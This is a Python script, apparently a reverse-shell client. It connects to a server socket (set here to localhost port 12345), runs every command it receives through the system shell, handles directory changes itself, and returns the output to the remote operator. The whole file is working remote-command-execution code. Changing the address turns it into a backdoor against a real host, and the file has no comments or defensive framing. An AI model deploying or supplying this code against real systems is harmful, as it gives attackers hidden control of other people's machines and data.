import socket
import os
import subprocess

QUIT = "quit"
UTF_ENCODE = "utf-8"

host = '127.0.0.1'
port = 12345


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print(f"connecting socket to {host} at port: {port}")
s.connect((host, port))

try:
    while True:
        byte_msg = s.recv(1024)
        decoded_msg = byte_msg.decode(UTF_ENCODE)
        print(f"Received command: {decoded_msg}")
        
        try:
            if decoded_msg.startswith("cd "):
                dir_path = decoded_msg.split(" ")[-1]
                if os.path.isdir(dir_path):
                    os.chdir(dir_path)
                    s.send((os.getcwd() + '> ').encode(UTF_ENCODE))
                else:
                    raise Exception("invalid cd command")
            elif decoded_msg == QUIT:
                s.send("done".encode(UTF_ENCODE))
                break
            else:
                result = subprocess.run(decoded_msg, shell=True, capture_output=True)
                if len(result.stderr) > 0:
                    raise Exception("invalid cd command")
                output_str = result.stdout.decode(UTF_ENCODE)
                s.send((output_str + str(os.getcwd() + '> ')).encode(UTF_ENCODE))

        except Exception as e:
            print(e)
            err_msg = f"{decoded_msg} is not valid command, {str(os.getcwd() + '> ')}"
            print(err_msg)
            s.send(err_msg.encode(UTF_ENCODE))
        

except Exception as e:
    print(e)
finally:
    print('closing the socket...')
    s.close()
    print('done!')